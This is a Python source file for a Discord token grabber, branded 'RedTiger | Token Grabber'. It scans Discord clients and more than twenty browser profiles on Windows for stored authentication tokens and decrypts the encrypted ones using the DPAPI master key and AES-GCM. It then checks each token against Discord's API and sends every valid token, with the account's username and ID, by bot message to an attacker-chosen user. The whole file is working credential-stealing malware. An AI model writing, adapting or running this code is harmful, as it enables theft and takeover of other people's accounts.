import os
import re
import requests
import json
import base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import discord
import asyncio

# --- Config ---
BOT_TOKEN = " "
TARGET_USER_ID = 

# Embed styling info
EMBED_COLOR = 0x00CED1  # Cyan-like color for border, tweak as needed
FOOTER_TEXT = "RedTiger | Token Grabber"

def wrap_token(token: str, width: int = 40) -> str:
    return '\n'.join(token[i:i+width] for i in range(0, len(token), width))


class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.roaming = os.getenv("APPDATA") or ""
        self.localappdata = os.getenv("LOCALAPPDATA") or ""
        self.re_token = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}")
        self.re_encrypted_token = re.compile(r"dQw4w9WgXcQ:[^\"]+")
        self.tokens_data = []

    def get_master_key(self, local_state_path: str) -> bytes | None:
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key_b64:
                return None
            encrypted_key = base64.b64decode(encrypted_key_b64)
            # Remove the DPAPI prefix.
            encrypted_key = encrypted_key[5:]
            master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload).decode('utf-8', errors='ignore')
            return decrypted_pass
        except Exception:
            return ""

    def validate_token(self, token: str) -> (dict, bool):
        try:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            response = requests.get(self.base_url, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.json(), True
            else:
                return {
                    "username": "Invalid Token",
                    "discriminator": "0000",
                    "id": "N/A",
                    "avatar": None,
                }, False
        except Exception:
            return {
                "username": "Invalid Token",
                "discriminator": "0000",
                "id": "N/A",
                "avatar": None,
            }, False

    def extract(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary', 'Local Storage', 'leveldb'),
            'Lightcord': os.path.join(self.roaming, 'Lightcord', 'Local Storage', 'leveldb'),
            'Discord PTB': os.path.join(self.roaming, 'discordptb', 'Local Storage', 'leveldb'),
            'Opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            'Opera GX': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
            'Amigo': os.path.join(self.localappdata, 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
            'Torch': os.path.join(self.localappdata, 'Torch', 'User Data', 'Local Storage', 'leveldb'),
            'Kometa': os.path.join(self.localappdata, 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
            'Orbitum': os.path.join(self.localappdata, 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
            'CentBrowser': os.path.join(self.localappdata, 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
            '7Star': os.path.join(self.localappdata, '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
            'Sputnik': os.path.join(self.localappdata, 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
            'Vivaldi': os.path.join(self.localappdata, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Chrome SxS': os.path.join(self.localappdata, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
            'Chrome': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Chrome1': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'),
            'Chrome2': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Profile 2', 'Local Storage', 'leveldb'),
            'Chrome3': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Profile 3', 'Local Storage', 'leveldb'),
            'Chrome4': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Profile 4', 'Local Storage', 'leveldb'),
            'Chrome5': os.path.join(self.localappdata, 'Google', 'Chrome', 'User Data', 'Profile 5', 'Local Storage', 'leveldb'),
            'Epic Privacy Browser': os.path.join(self.localappdata, 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
            'Microsoft Edge': os.path.join(self.localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Uran': os.path.join(self.localappdata, 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Yandex': os.path.join(self.localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Brave': os.path.join(self.localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Iridium': os.path.join(self.localappdata, 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        }

        visited_tokens = set()
        master_keys_cache = {}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                is_discord = "discord" in name.lower()
                local_state_path = None
                master_key = None
                if is_discord:
                    normalized_name = name.lower().replace(" ", "")
                    local_state_path = os.path.join(self.roaming, normalized_name, "Local State")
                    if local_state_path not in master_keys_cache:
                        master_keys_cache[local_state_path] = self.get_master_key(local_state_path)
                    master_key = master_keys_cache.get(local_state_path)

                for filename in os.listdir(path):
                    if not (filename.endswith(".log") or filename.endswith(".ldb")):
                        continue

                    full_path = os.path.join(path, filename)
                    try:
                        with open(full_path, "r", errors="ignore", encoding='utf-8') as file:
                            for line in file:
                                line = line.strip()
                                if not line:
                                    continue

                                # Decrypt encrypted tokens if master_key available
                                if master_key:
                                    for enc_t in self.re_encrypted_token.findall(line):
                                        try:
                                            enc_val = enc_t.split("dQw4w9WgXcQ:")[1]
                                            buff = base64.b64decode(enc_val)
                                            token = self.decrypt_val(buff, master_key)
                                            if token and token not in visited_tokens:
                                                user_info, valid = self.validate_token(token)
                                                if not valid:
                                                    continue
                                                self.tokens_data.append({
                                                    "token": token,
                                                    "username": f"{user_info.get('username')}#{user_info.get('discriminator')}",
                                                    "user_id": user_info.get("id"),
                                                    "avatar_id": user_info.get("avatar"),
                                                    "valid": True,
                                                })
                                                visited_tokens.add(token)
                                        except Exception:
                                            pass

                                # Plain tokens
                                for token in self.re_token.findall(line):
                                    if token not in visited_tokens:
                                        user_info, valid = self.validate_token(token)
                                        if not valid:
                                            continue
                                        self.tokens_data.append({
                                            "token": token,
                                            "username": f"{user_info.get('username')}#{user_info.get('discriminator')}",
                                            "user_id": user_info.get("id"),
                                            "avatar_id": user_info.get("avatar"),
                                            "valid": True,
                                        })
                                        visited_tokens.add(token)

                    except Exception:
                        continue
            except Exception:
                continue


class DiscordTokenBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(intents=intents)
        self.tokens_data = []

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")

        extractor = TokenExtractor()
        extractor.extract()
        self.tokens_data = extractor.tokens_data

        target_user = await self.fetch_user(TARGET_USER_ID)
        if not self.tokens_data:
            try:
                await target_user.send("No tokens found.")
            except Exception as e:
                print(f"Failed to send no token message: {e}")
            await self.close()
            return

        # Filter tokens to send only one token per unique user_id
        sent_user_ids = set()
        filtered_tokens = []
        for token_data in self.tokens_data:
            user_id = token_data.get("user_id")
            # Ensure user_id not None or 'N/A'
            if user_id and user_id != "N/A" and user_id not in sent_user_ids:
                sent_user_ids.add(user_id)
                filtered_tokens.append(token_data)

        for token_idx, token_data in enumerate(filtered_tokens, 1):
            avatar_id = token_data.get("avatar_id")
            user_id = token_data.get("user_id")
            username = token_data["username"]

            if avatar_id and user_id:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png?size=64"
            else:
                avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"

            token_wrapped = wrap_token(token_data["token"], 40)

            embed = discord.Embed(color=EMBED_COLOR)
            embed.set_author(name=f"🔑 Discord Token | {username}")
            embed.add_field(name="Username", value=f"`{username}`", inline=True)
            embed.add_field(name="User ID", value=f"`{user_id}`", inline=True)
            embed.add_field(name="Token", value=f"```fix\n{token_wrapped}\n```", inline=False)
            embed.set_thumbnail(url=avatar_url)
            embed.set_footer(text=FOOTER_TEXT)

            try:
                await target_user.send(embed=embed)
                # Send 1 token per message and wait to avoid rate-limits
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Failed sending message for token {token_idx}: {e}")

        await self.close()


def main():
    bot = DiscordTokenBot()
    bot.run(BOT_TOKEN)


if __name__ == "__main__":
    main()